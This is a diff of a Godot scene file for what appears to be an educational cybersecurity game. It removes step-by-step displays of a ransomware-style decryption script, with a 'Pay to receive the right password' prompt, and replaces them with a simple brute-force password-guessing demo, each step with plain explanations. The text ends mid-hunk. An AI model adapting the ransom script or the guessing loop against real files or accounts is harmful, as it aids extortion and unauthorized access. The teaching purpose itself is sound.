@@ -1,11 +1,11 @@
-[gd_scene load_steps=50 format=3 uid="uid://6yl41qxmeq2t"]
+[gd_scene load_steps=52 format=3 uid="uid://dxlue7cpddlnh"]
 
-[ext_resource type="Script" uid="uid://ckfxgu1kkib3k" path="res://Scripts/GUI/code_editor_ui.gd" id="1_oyu1b"]
-[ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_peaif"]
-[ext_resource type="FontFile" uid="uid://c4mm3of2mc8o5" path="res://addons/phantom_camera/fonts/Nunito-Black.ttf" id="3_h2uiv"]
-[ext_resource type="Script" uid="uid://dymocqk677j5n" path="res://Scripts/GUI/code_edit_window.gd" id="4_c0heo"]
-[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/gui/next_button.tscn" id="5_ad76e"]
-[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/gui/back_button.tscn" id="6_8rapc"]
+[ext_resource type="Script" uid="uid://ckfxgu1kkib3k" path="res://Scripts/GUI/code_editor_ui.gd" id="1_gi6xj"]
+[ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_jxoe6"]
+[ext_resource type="FontFile" uid="uid://c4mm3of2mc8o5" path="res://addons/phantom_camera/fonts/Nunito-Black.ttf" id="3_t1hkx"]
+[ext_resource type="Script" uid="uid://dymocqk677j5n" path="res://Scripts/GUI/code_edit_window.gd" id="4_yxh0e"]
+[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/gui/next_button.tscn" id="5_n672d"]
+[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/gui/back_button.tscn" id="6_fkg8t"]
 
 [sub_resource type="StyleBoxFlat" id="StyleBoxFlat_t4n35"]
 content_margin_left = 19.0
@@ -21,7 +21,7 @@ corner_radius_bottom_right = 15
 corner_radius_bottom_left = 15
 
 [sub_resource type="FontVariation" id="FontVariation_h8m8q"]
-base_font = ExtResource("3_h2uiv")
+base_font = ExtResource("3_t1hkx")
 
 [sub_resource type="DPITexture" id="DPITexture_pkbn6"]
 _source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\"><path fill=\"none\" stroke=\"#b2b2b2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-opacity=\".45\" stroke-width=\"2\" d=\"m5 7 3 3 3-3\"/></svg>
@@ -52,7 +52,7 @@ _source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\">
 [sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_de0th"]
 
 [sub_resource type="FontVariation" id="FontVariation_31cwg"]
-base_font = ExtResource("3_h2uiv")
+base_font = ExtResource("3_t1hkx")
 
 [sub_resource type="Theme" id="Theme_x5n46"]
 FoldableContainer/colors/collapsed_font_color = Color(1, 1, 1, 1)
@@ -139,33 +139,22 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFGHIJKLMNOPQ
+RSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -189,7 +178,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["A decryption script’s role is to unlock encrypted files using the correct key. It loads the key, runs the decryption algorithm, and restores the original data. Without it, the files remain locked, unreadable, and useless."]
+"values": ["A brute force attack is a way hackers try to break into a system by guessing the password or key through every possible combination. Instead of using smart tricks, they rely on the computer’s speed to test thousands or even millions of possibilities until the right one works. Think of it like trying to open a lock by testing every single key until one finally fits. While this method always works eventually, it can take a very long time if the password is strong and complex."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -201,7 +190,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decyption Script"]
+"values": ["⚠️BRUTE FORCE ALERT⚠️"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -300,33 +289,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -350,9 +327,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["At the very beginning, the program brings in some tools it needs to work. The ”os” tool helps it look around in folders and find files, kind of like a file explorer. The Fernet tool (from cryptography) is the one that actually locks and unlocks the files safely.
-
-In short: os is the organizer, and Fernet is the lock-and-key system."]
+"values": ["We start by importing Python’s random module. This gives us tools to generate random values. Without this, we couldn’t make random guesses."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -364,7 +339,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Importing the Tools"]
+"values": ["Import the random module"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -376,7 +351,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.135)]
+"values": [Vector2(0.135, 0.135)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -388,122 +363,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 0.565)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [0.0]
-}
-
-[sub_resource type="Animation" id="Animation_k4s4l"]
-resource_name = "ransomware_step_02"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
-
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
-
-print(allfiles)
-
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["In this part, the program is just making a list of files that it will later try to unlock. It looks at every file in the current folder, but intentionally ignores three special files (malware.py, key.key, and decr.py) so it won’t touch the program itself, the secret key, or the decryption tool. 
-
-For each thing it finds, it checks “Is this a real file or just a folder?” — only real files are added to the allfiles[] list. At the end it prints that list so you can see exactly which files were chosen."]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Collecting Files to Encrypt"]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(0.1, 1.06)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(3.675, 2.78)]
+"values": [Vector2(3.025, 0.26)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -530,33 +390,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -580,7 +428,9 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["The program opens a file called key.key and reads what’s inside. That file holds the secret Fernet key, which is basically the password needed to unlock all the scrambled files. Without it, the program wouldn’t be able to turn the data back into its original form."]
+"values": ["The character variable contains all the characters we allow in our password attempts such as:
+
+Numbers (0–9), small letters (a–z, ñ), capital letters (A–Z, Ñ), and even a space."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -592,7 +442,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Loading the Password key"]
+"values": ["Define possible characters"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -604,7 +454,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.105)]
+"values": [Vector2(0.1, 0.745)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -616,7 +466,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 0.62)]
+"values": [Vector2(3.82, 0.905)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -628,7 +478,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [13.0]
+"values": [0.0]
 }
 
 [sub_resource type="Animation" id="Animation_cxtjw"]
@@ -643,33 +493,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -693,7 +531,9 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Next, the program sets a password inside the code itself, called the passphrase \"WhiteHat\""]
+"values": ["The character_list variable turn the string into a list of single characters, for example: ['0', '1', 'b', 'Ñ', ' '].
+ 
+This makes it easier for Python to randomly pick letters one by one and try all possible character combinations until it matches the password we entered."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -705,7 +545,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decryption Password"]
+"values": ["Define possible characters"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -717,7 +557,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.75)]
+"values": [Vector2(0.1, 1.69)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -741,7 +581,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [13.0]
+"values": [0.0]
 }
 
 [sub_resource type="Animation" id="Animation_wf7ls"]
@@ -756,33 +596,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -806,7 +634,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["The program then asks the user to type in the password they were given. This works like a security guard at the door — even if someone managed to steal the real key file (key.key), they still can’t get in unless they also know the secret password."]
+"values": ["The user password here is specified as 'Cyper2025', and the computer will try to guess it. The computer will combine all possible character combinations stored in character variable."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -818,7 +646,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Ask for the Passphrase"]
+"values": ["Setting up the password"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -830,7 +658,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 1.065)]
+"values": [Vector2(0.1, 2.275)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -842,7 +670,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.77, 0.555)]
+"values": [Vector2(3.77, 0.335)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -854,7 +682,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [13.0]
+"values": [0.0]
 }
 
 [sub_resource type="Animation" id="Animation_vuf0p"]
@@ -869,33 +697,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -919,7 +735,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["If the user types the correct passphrase, the decyption program begins the real work"]
+"values": ["Before guessing begins, we set variable guess to an empty string. This will later store the computer’s password guesses."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -931,7 +747,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["Initializing guess variable"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -943,7 +759,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.12)]
+"values": [Vector2(0.1, 2.635)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -955,7 +771,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.31)]
+"values": [Vector2(3.735, 0.265)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -967,7 +783,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [0.0]
 }
 
 [sub_resource type="Animation" id="Animation_gu46y"]
@@ -982,33 +798,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list,                     k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1032,7 +836,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [" It opens each encrypted file and reads the scrambled data inside."]
+"values": ["This loop will Keep guessing again and again until the guess is exactly the same as the password.The loop won’t stop until the guess variable matches the password."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1044,7 +848,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["The guessing loop"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1056,7 +860,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.435)]
+"values": [Vector2(0.1, 1.67)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1068,7 +872,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.93)]
+"values": [Vector2(3.735, 1.86)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1080,7 +884,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [8.255]
 }
 
 [sub_resource type="Animation" id="Animation_de0th"]
@@ -1095,33 +899,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1145,7 +937,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["It uses the Fernet key to decrypt (or “unscramble”) that data."]
+"values": ["It picks a random characters from the list."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1157,7 +949,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["Make a random guess"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1169,7 +961,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 1.36)]
+"values": [Vector2(0.1, 1.975)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1181,7 +973,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.645)]
+"values": [Vector2(3.735, 0.625)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1193,120 +985,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
-}
-
-[sub_resource type="Animation" id="Animation_31cwg"]
-resource_name = "ransomware_step_09"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
-
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
-
-print(allfiles)
-
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["It opens the same file again, but this time in write binary mode, and replaces the scrambled content with the original, readable version. "]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Decrypt the Files"]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0),
